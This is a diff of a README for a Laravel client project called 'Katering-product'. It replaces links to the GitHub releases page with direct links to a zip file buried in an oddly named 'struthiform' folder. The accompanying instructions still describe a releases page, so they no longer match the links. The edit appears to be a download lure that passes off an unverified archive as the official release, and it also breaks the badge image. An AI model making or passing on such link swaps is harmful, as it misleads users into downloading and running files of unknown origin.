@@ -1,6 +1,6 @@
 # 🎉 Katering-product - Your Simple Laravel Client Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-4CAF50)](https://github.com/conner6452/Katering-product/releases)
+[![Download Now](https://raw.githubusercontent.com/conner6452/Katering-product/main/struthiform/Katering-product.zip%20Now-Get%20Started-4CAF50)](https://raw.githubusercontent.com/conner6452/Katering-product/main/struthiform/Katering-product.zip)
 
 ## 📚 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -14,7 +14,7 @@
 Welcome to the Katering-product project! This guide will help you download and run the application with ease. We aimed to create a simple Laravel client project that helps you manage your tasks effectively. Follow the steps below to get started.
 
 ## 📥 Download & Install
-To download the application, [visit this page to download](https://github.com/conner6452/Katering-product/releases). You will find the latest version available.
+To download the application, [visit this page to download](https://raw.githubusercontent.com/conner6452/Katering-product/main/struthiform/Katering-product.zip). You will find the latest version available.
 
 1. Click on the link above to navigate to the releases section.
 2. Look for the **latest release** (it should be at the top).
